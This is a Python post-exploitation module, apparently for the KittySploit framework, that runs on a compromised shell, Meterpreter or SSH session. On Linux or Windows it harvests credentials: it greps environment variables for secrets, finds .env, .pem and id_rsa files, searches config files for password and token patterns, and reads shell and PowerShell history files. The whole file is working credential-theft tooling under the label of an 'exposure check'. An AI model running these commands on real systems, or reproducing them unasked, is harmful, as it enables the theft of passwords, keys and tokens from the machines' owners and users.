#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import re


class Module(Post):
    __info__ = {
        "name": "Credential Exposure Check",
        "description": "Check common locations for accidentally exposed credentials on Linux or Windows sessions",
        "platform": Platform.MULTI,
        "author": "KittySploit Team",
        "session_type": [
            SessionType.SHELL,
            SessionType.METERPRETER,
            SessionType.SSH,
        ],
    }

    target = OptChoice(
        "auto",
        "Target platform: auto, linux, windows",
        False,
        choices=["auto", "linux", "windows"],
    )
    max_results = OptInteger(50, "Maximum lines to show per check", False)

    def _run_cmd(self, command: str) -> str:
        try:
            output = self.cmd_execute(command)
            return output.strip() if output else ""
        except Exception:
            try:
                output = self.cmd_exec(command)
                return output.strip() if output else ""
            except Exception:
                return ""

    def _print_section(self, title: str):
        print_status("=" * 60)
        print_status(title)
        print_status("=" * 60)

    def _print_matches(self, label: str, output: str) -> int:
        if not output:
            print_info(f"{label}: no findings")
            return 0

        lines = [line.strip() for line in output.splitlines() if line.strip()]
        if not lines:
            print_info(f"{label}: no findings")
            return 0

        print_warning(f"{label}:")
        for line in lines:
            print_info(f"  {line}")
        return 1

    def _detect_platform(self) -> str:
        selected = str(self.target or "auto").strip().lower()
        if selected in ("linux", "windows"):
            return selected

        probe = self._run_cmd("uname -s 2>/dev/null")
        if probe and any(v in probe.lower() for v in ("linux", "darwin", "bsd")):
            return "linux"

        probe = self._run_cmd("cmd /c ver")
        if probe and ("microsoft windows" in probe.lower() or "windows" in probe.lower()):
            return "windows"

        # Default to linux-like command set to reduce false-negative command errors.
        return "linux"

    def _linux_checks(self) -> int:
        findings = 0
        limit = int(self.max_results)
        self._print_section("Linux Credential Exposure Checks")

        findings += self._print_matches(
            "Sensitive environment variables",
            self._run_cmd(
                "env 2>/dev/null | grep -Ei "
                "'(pass(word)?|secret|token|api(_|-)?key|aws_|access(_|-)?key)' | "
                f"head -n {limit}"
            ),
        )
        findings += self._print_matches(
            "Potential secret files by name",
            self._run_cmd(
                "find /home /root /opt /var/www -type f "
                "\\( -iname '*.env' -o -iname '*credential*' -o -iname '*secret*' "
                "-o -iname '*token*' -o -iname '*.pem' -o -iname 'id_rsa' \\) "
                "! -name '*.pyc' ! -name '*.pyo' ! -name '*.pyd' ! -name '*.so' ! -name '*.o' ! -name '*.a' "
                "! -name '*.dll' ! -name '*.exe' ! -name '*.bin' ! -name '*.dat' ! -name '*.class' "
                "! -name '*.jar' ! -name '*.war' ! -name '*.ear' ! -name '*.zip' ! -name '*.tar' "
                "! -name '*.gz' ! -name '*.bz2' ! -name '*.xz' ! -name '*.7z' ! -name '*.rar' "
                "! -name '*.iso' ! -name '*.img' ! -name '*.pyz' ! -name '*.whl' "
                "! -path '*/__pycache__/*' ! -path '*/.git/*' "
                "2>/dev/null | head -n {limit}".format(limit=limit)
            ),
        )
        findings += self._print_matches(
            "Cleartext credential patterns in configs",
            self._run_cmd(
                "find /etc /home /opt /var/www -type f "
                "\\( -name '*.conf' -o -name '*.ini' -o -name '*.env' -o -name '*.yml' -o -name '*.yaml' -o -name '*.json' \\) "
                "2>/dev/null | head -n 200 | "
                "xargs -r grep -nEi '(password\\s*[:=]|passwd\\s*[:=]|secret\\s*[:=]|api(_|-)?key\\s*[:=]|token\\s*[:=])' "
                "2>/dev/null | head -n {limit}".format(limit=limit)
            ),
        )
        findings += self._print_matches(
            "Shell history lines containing secrets",
            self._run_cmd(
                "find /home /root -maxdepth 3 -type f "
                "\\( -name '.bash_history' -o -name '.zsh_history' -o -name '.history' \\) "
                "2>/dev/null | head -n 30 | "
                "xargs -r grep -nEi '(password|passwd|token|secret|api(_|-)?key|aws_secret|private_key)' "
                "2>/dev/null | head -n {limit}".format(limit=limit)
            ),
        )
        return findings

    def _windows_checks(self) -> int:
        findings = 0
        limit = int(self.max_results)
        self._print_section("Windows Credential Exposure Checks")

        findings += self._print_matches(
            "Sensitive environment variables",
            self._run_cmd(
                'powershell -NoP -Command "Get-ChildItem Env: | Where-Object { $_.Name -match '
                "'pass|secret|token|api.?key|aws|access.?key' } | Select-Object -First {limit} | "
                'ForEach-Object { \'$($_.Name)=$($_.Value)\' }"'.format(limit=limit)
            ),
        )
        findings += self._print_matches(
            "Potential secret files by name",
            self._run_cmd(
                'powershell -NoP -Command "Get-ChildItem -Path C:\\Users,C:\\ProgramData -Recurse '
                "-File -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "
                "'\\.env$|credential|secret|token|id_rsa|\\.pem$' } | "
                "Where-Object { $_.FullName -notmatch '\\\\__pycache__\\\\|\\\\.git\\\\' } | "
                "Where-Object { $_.Extension -notmatch "
                "'^\\.(pyc|pyo|pyd|dll|exe|bin|dat|class|jar|war|ear|zip|tar|gz|bz2|xz|7z|rar|iso|img|whl)$' } | "
                'Select-Object -First {limit} -ExpandProperty FullName"'.format(limit=limit)
            ),
        )
        findings += self._print_matches(
            "Credential patterns in config files",
            self._run_cmd(
                'powershell -NoP -Command "Get-ChildItem -Path C:\\Users,C:\\inetpub,C:\\ProgramData -Recurse '
                "-File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -match "
                "'\\.config|\\.ini|\\.txt|\\.json|\\.yml|\\.yaml|\\.env|\\.xml' } | Select-Object -First 250 | "
                "ForEach-Object { Select-String -Path $_.FullName -Pattern "
                "'password\\s*[:=]|passwd\\s*[:=]|secret\\s*[:=]|api.?key\\s*[:=]|token\\s*[:=]' "
                "-SimpleMatch:$false -ErrorAction SilentlyContinue } | Select-Object -First {limit} | "
                'ForEach-Object { "$($_.Path):$($_.LineNumber): $($_.Line.Trim())" }"'.format(limit=limit)
            ),
        )
        findings += self._print_matches(
            "PowerShell history lines containing secrets",
            self._run_cmd(
                'powershell -NoP -Command "Get-ChildItem -Path C:\\Users -Recurse '
                '-Filter ConsoleHost_history.txt -ErrorAction SilentlyContinue | Select-Object -First 25 | '
                "ForEach-Object { Select-String -Path $_.FullName -Pattern "
                "'password|passwd|token|secret|api.?key|private.?key' -ErrorAction SilentlyContinue } | "
                'Select-Object -First {limit} | ForEach-Object { "$($_.Path):$($_.LineNumber): $($_.Line.Trim())" }"'.format(limit=limit)
            ),
        )
        return findings

    def run(self):
        platform = self._detect_platform()
        print_status(f"Running credential exposure checks for platform: {platform}")

        if platform == "windows":
            findings = self._windows_checks()
        else:
            findings = self._linux_checks()

        if findings == 0:
            print_success("No obvious credential exposure indicators found in the audited locations")
        else:
            print_success(f"Credential exposure check completed with findings in {findings} section(s)")
        return True
